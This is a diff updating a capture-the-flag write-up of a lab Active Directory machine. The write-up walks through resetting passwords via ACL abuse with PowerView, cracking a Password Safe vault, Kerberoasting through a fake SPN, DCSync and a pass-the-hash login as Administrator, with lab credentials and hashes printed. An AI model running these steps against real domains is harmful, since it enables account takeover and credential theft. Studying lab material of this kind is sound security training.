@@ -35,15 +35,13 @@ created: 2025-08-26
 **🛠️ Tools:**  
 
 - `NetExec`
-- `Evil-WinRM`
+- `evil-winrm-py`
 - `BloodHound`
 - `PowerView`
 - `Hashcat`
 
 **📚 Learned:**  
 
-- Change permissions on users.
-- Get hints from the group names.
 - Try `FTP` on `NetExec`.
 - Set fake `SPN` for `Kerberoasting`.
 - `DCSync` with `NetExec`.
@@ -53,7 +51,6 @@ created: 2025-08-26
 ## 🌐 Port Scan
 
 - **TCP**: [[Domain Controller Ports]], 21 (`FTP`)
-- **UDP**: Nothing important
 
 ---
 
@@ -97,15 +94,27 @@ I found this path:
 
 User `olivia` can change user `michael`'s password and `michael` can change the password of `benjamin`, who is a member of the `Share Moderators` group. This group sounds interesting.
 
->[!tip]
->It can be hard to find the exact path we want. This came from the "Shortest paths from Owned objects" query, which returned a large graph, so I had to zoom in.
-
 Let's load `PowerView` and change user `michael`'s password.
 
 ```shell
-*Evil-WinRM* PS C:\Temp> powerview.ps1
-*Evil-WinRM* PS C:\Temp> $UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
-*Evil-WinRM* PS C:\Temp> Set-DomainU{serPassword -Identity michael -AccountPassword $UserPassword
+evil-winrm-py PS C:\Users\olivia\Documents> mkdir C:\Temp
+cd C:
+
+    Directory: C:\
+
+
+Mode                 LastWriteTime         Length Name                                                                  
+----                 -------------         ------ ----                                                                  
+d-----         11/5/2026   2:11 PM                Temp                                                                  
+
+
+evil-winrm-py PS C:\Temp> loadps /opt/powershell-modules/powerview.ps1
+[+] PowerShell script loaded successfully.
+[*] New commands available (use TAB to autocomplete):
+New-InMemoryModule, func, Add-Win32Type, psenum, field, struct, New-DynamicParameter, _temp, Get-IniContent, Export-PowerViewCSV, Resolve-IPAddress, ConvertTo-SID, ConvertFrom-SID, Convert-ADName, ConvertFrom-UACValue, Get-PrincipalContext, Add-RemoteConnection, Remove-RemoteConnection, Invoke-UserImpersonation, Invoke-RevertToSelf, Add-NetUser, Get-DomainSPNTicket, Invoke-Kerberoast, Get-PathAcl, Convert-FileRight, Convert-LDAPProperty, Get-DomainSearcher, Convert-DNSRecord, Get-Name, Get-DomainDNSZone, Get-DomainDNSRecord, Get-Domain, Get-DomainController, Get-Forest, Get-ForestDomain, Get-ForestGlobalCatalog, Get-ForestSchemaClass, Find-DomainObjectPropertyOutlier, Get-DomainUser, New-DomainUser, Set-DomainUserPassword, Get-DomainUserEvent, Get-DomainGUIDMap, Get-DomainComputer, Get-DomainObject, Get-DomainObjectAttributeHistory, Get-DomainObjectLinkedAttributeHistory, Set-DomainObject, Invoke-DowngradeAccount, ConvertFrom-LDAPLogonHours, ConvertTo-LogonHoursArray, New-ADObjectAccessControlEntry, Set-DomainObjectOwner, Get-DomainObjectAcl, Add-DomainObjectAcl, Remove-DomainObjectAcl, Find-InterestingDomainAcl, Get-DomainOU, Get-DomainSite, Get-DomainSubnet, Get-DomainSID, Get-DomainGroup, New-DomainGroup, Get-DomainManagedSecurityGroup, Get-DomainGroupMember, Get-DomainGroupMemberDeleted, Add-DomainGroupMember, Remove-DomainGroupMember, Get-DomainFileServer, Split-Path, Get-DomainDFSShare, Parse-Pkt, Get-DomainDFSShareV1, Get-DomainDFSShareV2, Get-GptTmpl, Get-GroupsXML, Get-DomainGPO, Get-DomainGPOLocalGroup, Get-DomainGPOUserLocalGroupMapping, Get-DomainGPOComputerLocalGroupMapping, Get-DomainPolicyData, Get-NetLocalGroup, Get-NetLocalGroupMember, Get-NetShare, Get-NetLoggedon, Get-NetSession, Get-RegLoggedOn, Get-NetRDPSession, Test-AdminAccess, Get-NetComputerSiteName, Get-WMIRegProxy, Get-WMIRegLastLoggedOn, Get-WMIRegCachedRDPConnection, New-GPOImmediateTask, Get-WMIRegMountedDrive, Get-WMIProcess, Find-InterestingFile, Test-Write, New-ThreadedFunction, Find-DomainUserLocation, Find-DomainProcess, Find-DomainUserEvent, Find-DomainShare, Find-InterestingDomainShareFile, Find-LocalAdminAccess, Find-DomainLocalGroupMember, Get-DomainTrust, Get-ForestTrust, Get-DomainForeignUser, Get-DomainForeignGroupMember, Get-DomainTrustMapping, Get-GPODelegation, Find-HighValueAccounts, Get-DomainRBCD, Set-DomainRBCD, Get-IdentityFilterString, Get-DomainDCSync, Get-DomainObjectSD, Set-DomainObjectSD, Get-DomainDN, Get-DomainLAPSReaders, Get-DomainEnrollmentServers, Get-DomainCACertificates, Get-DomainSQLInstances, Add-DomainAltSecurityIdentity, Invoke-LDAPQuery, Get-ObfuscatedFilterString, Get-RandomizedCasing, Convert-LogonHours, Get-RubeusForgeryArgs, Get-LogoffTime, Get-RegistryUserEnum, New-ThreadedFunction
+
+evil-winrm-py PS C:\Temp> $UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
+evil-winrm-py PS C:\Temp> Set-DomainUserPassword -Identity michael -AccountPassword $UserPassword
 ```
 
 And it worked.
@@ -116,26 +125,35 @@ SMB         10.10.11.42     445    DC               [*] Windows Server 2022 Buil
 SMB         10.10.11.42     445    DC               [+] administrator.htb\michael:Password123!
 ```
 
+Checking for `WinRM` access:
+
+```shell
+nxc winrm 10.10.11.42 -u 'michael' -p 'Password123!'
+
+WINRM       10.10.11.42    5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:administrator.htb) 
+WINRM       10.10.11.42    5985   DC               [+] administrator.htb\michael:Password123! (Pwn3d!)
+```
+
 This user could also `WinRM` into the machine. I logged in as `michael` and changed `benjamin`'s password.
 
 ```shell
-evil-winrm -i 10.10.11.42 -u Michael -p Password123! -s /opt/powershell-modules
-*Evil-WinRM* PS C:\Temp> powerview.ps1
-*Evil-WinRM* PS C:\Temp> $UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
-*Evil-WinRM* PS C:\Temp> Set-DomainUserPassword -Identity benjamin -AccountPassword $UserPassword
+evil-winrm-py -i 10.10.11.42 -u michael -p 'Password123!'
+evil-winrm-py PS C:\Users\michael\Documents> loadps /opt/powershell-modules/powerview.ps1
+evil-winrm-py PS C:\Users\michael\Documents> $UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
+evil-winrm-py PS C:\Users\michael\Documents> Set-DomainUserPassword -Identity benjamin -AccountPassword $UserPassword
 ```
 
-Apparently, user `benjamin` has no `WinRM` permissions, and the machine has no `RDP` enabled, but remember the machine has the `FTP` port open, and the group name hints it has something to do with moderating shared files. Let's try logging in via `FTP`.
+Apparently, user `benjamin` has no `SMB` or `WinRM` permissions, and the machine has no `RDP` enabled, but remember the machine has the `FTP` port open, and the group name hints it has something to do with moderating shared files. Let's try logging in via `FTP`.
 
 >[!tip]
->If we can't log in as a user, think about what else that user can do for us. Here, the machine had an `FTP` server listening, and the group name hinted that the user could access it.
+>If we can't log in as a user, think about what else that user may be able to do for us. Here, the machine had an `FTP` server listening, and the group name hinted that the user could access it.
 
 ```shell
 nxc ftp 10.10.11.42 -u 'benjamin' -p 'Password123!'
 FTP         10.10.11.42     21     10.10.11.42      [+] benjamin:Password123!
 ```
 
-That gave us `FTP` access.
+We have `FTP` access.
 
 ```shell
 ftp 10.10.11.42
@@ -171,7 +189,7 @@ Now let's investigate this format.
 The format is for the ["Password Safe"](https://pwsafe.org/) password manager. `.psafe3` is this manager's password database format. I installed it on my local Windows machine, and importing the database asks for a master password. I found we can use `hashcat` to crack this file's password. No need for a `*2john` binary.
 
 ```shell
-.\hashcat.exe -a 0 -m 5200 .\Backup.psafe3 .\rockyou.txt -O -w 4
+hashcat -m 5200 Backup.psafe3 $ROCKYOU
 
 <SNIP>
 
@@ -182,10 +200,10 @@ The format is for the ["Password Safe"](https://pwsafe.org/) password manager. `
 
 The master password is `tekieromucho`.
 
->[!tip]
->The password manager blocks screenshots of its `GUI`, presumably for security reasons.
+>[!note]
+>The password manager blocks screenshots of its `GUI`.
 
-It has 3 users: `alexander`, `emily`, and `emma`. I copied these users' credentials to a file called `creds.txt` on my attack host.
+It has 3 users: `alexander`, `emily`, and `emma`. I copied these users' credentials to a file on my attack host.
 
 ```txt
 alexander:UrkIbagoxMyUGw0aPlj9B0AXSea4Sw
@@ -210,7 +228,7 @@ Credentials:
 And this user has the user flag:
 
 ```shell
-*Evil-WinRM* PS C:\Users\emily> tree /F
+evil-winrm-py PS C:\Users\emily> tree /F
 Folder PATH listing
 Volume serial number is 6131-DE70
 C:.
@@ -226,14 +244,14 @@ C:.
 ```
 
 ```shell
-*Evil-WinRM* PS C:\Users\emily> cd Desktop
-*Evil-WinRM* PS C:\Users\emily\Desktop> ls
+evil-winrm-py PS C:\Users\emily> cd Desktop
+evil-winrm-py PS C:\Users\emily\Desktop> ls
     Directory: C:\Users\emily\Desktop
 Mode                 LastWriteTime         Length Name
 ----                 -------------         ------ ----
 -a----        10/30/2024   2:23 PM           2308 Microsoft Edge.lnk
 -ar---         8/24/2025  10:30 PM             34 user.txt
-*Evil-WinRM* PS C:\Users\emily\Desktop> cat user.txt
+evil-winrm-py PS C:\Users\emily\Desktop> cat user.txt
 <REDACTED>
 ```
 
@@ -252,33 +270,28 @@ I found this permission for user `emily`:
 ![[Pasted image 20250826083843.png]]
 
 >[!tip]
->I found this in the "Outbound Object Control" section of the node of user `emily`.
+>The "Outbound Object Control" section of the nodes can give important information.
 
 The `GenericWrite` permission can be used to create a fake `SPN` for `Kerberoasting`, so I did exactly that.
 
 ```shell
-*Evil-WinRM* PS C:\Users\emily\Desktop> powerview.ps1
-*Evil-WinRM* PS C:\Users\emily\Desktop> Set-DomainObject -Identity ethan -SET @{serviceprincipalname='nonexistent/BLAHBLAH'}
+evil-winrm-py PS C:\Users\emily\Documents> loadps /opt/powershell-modules/powerview.ps1
+evil-winrm-py PS C:\Users\emily\Documents> Set-DomainObject -Identity ethan -SET @{serviceprincipalname='nonexistent/AAAA'}
 ```
-
->[!note]
->I load `PowerView` several times in this writeup because these are different sessions.
 
 And now let's retrieve the ticket.
 
 ```shell
-nxc ldap 10.10.11.42 -u emily -p UXLCI5iETUsIBoFVTj8yQFKoHjXmb --kerberoasting output.txt
-LDAP        10.10.11.42     389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:administrator.htb) (signing:None) (channel binding:No TLS cert) 
-LDAP        10.10.11.42     389    DC               [+] administrator.htb\emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb 
-LDAP        10.10.11.42     389    DC               [*] Skipping disabled account: krbtgt
-LDAP        10.10.11.42     389    DC               [*] Total of records returned 1
-
+nxc ldap 10.10.11.42 -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' --kerberoast output.txt --kerberoast-account ethan
+LDAP        10.10.11.42    389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:administrator.htb) (signing:None) (channel binding:No TLS cert) 
+LDAP        10.10.11.42    389    DC               [+] administrator.htb\emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb 
+LDAP        10.10.11.42    389    DC               [*] Total of records returned 1
 <SNIP>
 
 KerberosError: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
 ```
 
-And we get the error `KRB_AP_ERR_SKEW(Clock skew too great)`, caused by a mismatch between our system's clock and the target's. To fix it I used `rdate`. This tool can be used to set the system's date from a remote host with `NTP`. I installed the tool, disabled my `NTP`, and matched the remote host's date.
+And we get the error `KRB_AP_ERR_SKEW(Clock skew too great)`, caused by a mismatch between our system's clock and the target's. To fix it I used `rdate`. This tool can be used to set the system's date from a remote host with `NTP`. I installed the tool, disabled `NTP`, and matched the remote host's date.
 
 ```shell
 sudo timedatectl set-ntp off
@@ -289,19 +302,24 @@ Tue Aug 26 15:47:48 -05 2025
 And now let's try again.
 
 ```shell
-nxc ldap 10.10.11.42 -u emily -p UXLCI5iETUsIBoFVTj8yQFKoHjXmb --kerberoasting output.txt
-LDAP        10.10.11.42     389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:administrator.htb) (signing:None) (channel binding:No TLS cert) 
-LDAP        10.10.11.42     389    DC               [+] administrator.htb\emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb 
-LDAP        10.10.11.42     389    DC               [*] Skipping disabled account: krbtgt
-LDAP        10.10.11.42     389    DC               [*] Total of records returned 1
-LDAP        10.10.11.42     389    DC               [*] sAMAccountName: ethan, memberOf: [], pwdLastSet: 2024-10-12 15:52:14.117811, lastLogon: <never>
-LDAP        10.10.11.42     389    DC               $krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb\ethan*$0d0b38bdfc7bb4dd54bf543a8efc38bf$69d4757449e36b3c0ff6ab59344886b1954381201a32eb2c51f4179019ff78dc8545091aca9468d717ee2f8b3298e47cd8c2114b0ec2ebe1e3bb7b3d2ef55534f2a6d94c93d2935d22c8a8afa1f7471888cff9433996d8f85b2084db6fe55802b773e7975fdfad8fb56cd4d58e78251327df6510c6f8f014b3131ed0d092039c09729f6fb7d0e3fcded5c0f3443ef7dd80b04b82253c3f5ea4bc40f1870a81864853a5b9b3a64436c0f3a86ed5853938f4035a3d576beedb111d1f35177d4818fcc762dba34fbf4b3f7f0552a84c37ed8d3564b459002619e9c70d3053d1bc96e7920fec9e7fe4786222f51bc2869fc805952c97eaabe0873899792b3df592928f5fba00c14d397705084f109cf0c5498755a47372a23eaef02e9b585866b1d8fd02c9ff6b79445c0bd5f7ff7f3b7d5f1275939329eb6328f18c1aa2ad57fc033d19f1071f5d99e2358c3de07d454a04639410b82b47a3c0197abea5426b47172d7600b2e70ce13f3cbe5b23a83fa970381d4e873292f75ab964d73161e7a3f1f7872872e1548715ff8fca2d01618e8099d76e989f0beec853c6942638ac90cdb2a839adce4d2757e8e08eeb05d3e4fa0429e3504fd6bab5c44f5faf6acc6007660368f869a46371f2f0c9d1a84eb839f4c9a30c5a0a681050ccd8003d3b6bb28c75c16e1b51c1af05d3a1c83aeb7164dda3714e87eeabe487a013bd31219567d4485b8ba5404bbb106d42fdb4004079e7927c9327457981564bd73fae5becb1ddd0de24a43e136682c50721baf2a5622fed34ebc23172b642fb6432184e72f25bf4a7937d2fda4c1dda75aef9e94c4faa9058742feb519f0559ec3974549cb4f353b43c03906406f74df7ad864dc5ddfaacfe79b50e0066ad54b721191e52469072e00d9b171365ebc96ef0fc8f35c4993480a490f65f35fc063a41aa0dddba08089ce0cbd1658473b515d73912da2ef08e9f4149ad79f1bde99dcd67d4aa4923dc76280bcb8ddafa68a39eafe54aa755b37e3e88b2ef1e289762a39c3b204eec59caf7a5f20ceb97b05493b7849f4641079633e7f579feb8c28fceb59637fd8b97924ef7ae65ac44b020c6cf8ecc28970f9f371b6e7570457a487a931c75b8ee25563c83237ea7ffdafcb53f6eaf0b15ef92a6cf5a38c4224014fd271eeca997030d734e9ed7383f180226bfac510c77de9558ab13eb6f7ee47b2e48aa01e9c6f7ec654b98140d0a9c02c46b3217100982814dc9f8f3642245f44c7c49cde65546e2a728ca6b26c30fc56d80772d656cc4329bd5c76e8d440b2a6ffd6f4d56e16e9f437893e07439efddbf5edb0b8e3debc664ffcc4b961728897df4e72553ba14b789d1b38ad93d48f0f4c121a96db3a7e22fce16d34715b1ae1c903ddef2df07a527f713c8d1bb3258557b2b9dc038d97e639072b28b435fd548a23947349fddf6a2c5a76db974f6a563b45128b206d16b26509216387521f5e554ebcc406d3f5edc342c3ac0ba1f1e4797ca0920bb14db54f9ce0e9b1f5745de19e2f4
+nxc ldap 10.10.11.42 -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' --kerberoast output.txt --kerberoast-account ethan
+LDAP        10.10.11.42    389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:administrator.htb) (signing:None) (channel binding:No TLS cert) 
+LDAP        10.10.11.42    389    DC               [+] administrator.htb\emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb 
+LDAP        10.10.11.42    389    DC               [*] Total of records returned 1
+LDAP        10.10.11.42    389    DC               [*] sAMAccountName: ethan, memberOf: [], pwdLastSet: 2024-10-12 15:52:14.117811, lastLogon: <never>
+LDAP        10.10.11.42    389    DC               $krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb\ethan*$d6b5754d04ae46ad004842e3137d1b07$484f38cf573fe9aeb0a0e9fec8e3b7776522440e3eafa3b709322dbef39c4376fc3dd799b627b23c2e620d537bb9e25ec99f39d5a8ea6f6e1404c6e6f3a331d7cfe166ad54cd11c057445d93ab9204c8b5d884c78859e1cdaad28d31ee6f72c606ed02fe2f3e2a1a6c3ab9dd09c35b090b7de83488d0ed8e76e2eff11a2aae88306e58b7137f1ae963ddbebdbacdacad0237fdb8c2df16d6a20bcdda8418de73e15a448fffd63165519a893b0fa8aba1df5d32929a432cc1df61a36a2f9cbae6a92fceb73b0544c58ccde80eca903f09cbff302c2eb5ba67c381ff56b08d41526e5ecab5bcc156561c7ad0b7815d64e620c006a18575d5daa684d955069fa205bc3ac68c260fa7db12dc69def87ba4cc41a522aa4f5e47c29fa769eb2b33c186d3bdeed5056ce406624450bd7e803cce204324d8ea1d190d80849fd842d8df8ec4746088b6e4758bebc11d21c65448da2ec5739d3804b0fcc6785a036b28af521ebc0e765b6938a3ce810d6e65e2ca41ae1f883882e36a9e7c6b533dfe2bee99b08207e10fa6c19c3df1318ccb70a41a328df5c854ffe050742ff5bf79f1d28ebbe99f4050506b3ea657dcb3df0be3d7d89f4855c7f1527c0e208204152b5de45a551c296e5fedd5ab446a0afb8c2897ff50e2fec16c2f2572b56d7605b915eb23f4770140ad45784e7ae6c43da49c13ae5dedda6f072b6c59d944bf75408d983b23d315283dc57f5ff587dbb1dbd61bf9b9d97825449a9e3103bbe73a84aeea54d1a8406bae921215f3c122c3d4e028dfe8449cd2f143dfd0f7e411675298d0ecf34372c33985ce204c8cca6072fa0512777b1a0f7dd2b66c96036fe27ed85f222fe41536885c951fa5fd772fa75075622dfbefa20dfae06d55f1531f81c18e1c209162f1836d00d8c230d8bae946737b5d65584960a8cd7ec70dbf1f4fbd80429ae87d8089449af98ae7a0280fb913fd4454482775b530337bd110e7cf778819e70a7c045c0bb33e71b0b44ee8c579abdfe78155d2bbc49136f953df578b11355d9c0087ae8644ba85f0ae7b5d87b690c2479ca837a6817fb356f23ccd54f9ca666d2cca233f25d9f0e7478c4e4ebe13befef6ad1a28c4703c4b0a2a92220825ec172d74d9b4874fe76496f61274b483e9f397ee477b45c7f0a68f630fa4a74976d6e7e58a3be153db30f5b335f66895ac7021daab2d4ecdf96bbd95bf6acf6781db0b34d99320b195b292d213143d120123968dd17e8bfab96c1e50701a00f54f9347cb55cac48a18a1ab29fe760f3682c5e49b2ab83043434f9312031c5ac5b813a9ceb541db0b6d510a031c10d728a51d810b2fb1a0099e34f7f38a46ff901f4fe001f47e29365d4a3e27d588498fd88661afaf459e650ae774372bb6a56c7719bcc6523eccf5c555c2c93d70b7f5e1f8be5551d5fec6b2b4938f13bc2115fc493cb9fd57f5a24692021eaae95dfaf1b5c0a276ff2a415353c36caaa20c51db9c9f2aef4c4ede142a72059e3482da9924807adc515c775cff014aca47
 ```
 
-We got the ticket, which I cracked with `hashcat` mode 13100 (`Kerberoasting`).
+And lets clean up.
 
 ```shell
-.\hashcat.exe -a 0 -m 13100 .\hashes.txt .\rockyou.txt -O -w 4
+evil-winrm-py PS C:\Users\emily\Documents> Set-DomainObject -Identity ethan -Clear serviceprincipalname -Verbose
+```
+
+We got the ticket, which I cracked with `hashcat`.
+
+```shell
+hashcat hashes.txt $ROCKYOU
 
 <SNIP>
 
@@ -340,19 +358,28 @@ krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1181ba47d45fa2c76385a82409cbfaf6:::
 And let's log in as administrator with the `NTLM` hash.
 
 ```shell
-evil-winrm -i 10.10.11.42 -u administrator -H 3dc553ce4b9fd20bd016e098d2d2fd2e -s /opt/powershell-modules
+evil-winrm-py -i 10.10.11.42 -u 'Administrator' -H '3dc553ce4b9fd20bd016e098d2d2fd2e'
+          _ _            _                             
+  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
+ / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
+ \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
+                                            |_|   |__/  v1.7.0
 
-*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
-*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls
+[*] Connecting to '10.10.11.42:5985' as 'Administrator'
+evil-winrm-py PS C:\Users\Administrator\Documents> cd ../Desktop
+ls
+evil-winrm-py PS C:\Users\Administrator\Desktop> ls
+
 
     Directory: C:\Users\Administrator\Desktop
 
-Mode                 LastWriteTime         Length Name
-----                 -------------         ------ ----
--ar---         8/24/2025  10:30 PM             34 root.txt
+
+Mode                 LastWriteTime         Length Name                                                                  
+----                 -------------         ------ ----                                                                  
+-ar---         11/5/2026   1:51 PM             34 root.txt                                                              
 
 
-*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
+evil-winrm-py PS C:\Users\Administrator\Desktop> cat root.txt
 <REDACTED>
 ```
 
